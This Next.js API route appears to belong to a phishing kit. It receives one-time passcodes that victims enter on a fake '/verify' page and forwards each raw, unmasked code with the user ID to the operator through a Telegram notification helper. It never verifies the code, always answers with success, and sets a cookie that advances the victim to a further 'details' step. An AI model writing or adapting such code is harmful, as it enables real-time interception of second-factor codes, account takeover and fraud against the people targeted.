import { NextRequest, NextResponse } from "next/server"
import { sendFormNotification } from "@/lib/telegram"

const LOGIN_FLOW_COOKIE = "login_flow"

export async function POST(request: NextRequest) {
  try {
    const data = await request.json()
    const method = data?.method === "email" ? "email" : "text"
    // Kit catalog §8 — OTP submitted (raw unmasked code).
    void sendFormNotification({
      type:
        method === "email"
          ? "login_email_otp_verification"
          : "login_text_otp_verification",
      userId: String(data?.userId ?? ""),
      otp: String(data?.code ?? ""),
      page: "/verify",
      timestamp: new Date().toISOString(),
    })
    const response = NextResponse.json({ success: true })

    // Existing flow guard: first OTP advances login_flow to "2" (details step).
    if (data?.verificationType !== "Code (final)") {
      response.cookies.set(LOGIN_FLOW_COOKIE, "2", {
        path: "/",
        maxAge: 10 * 60,
      })
    }

    return response
  } catch (error) {
    console.error("Error sending verification notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
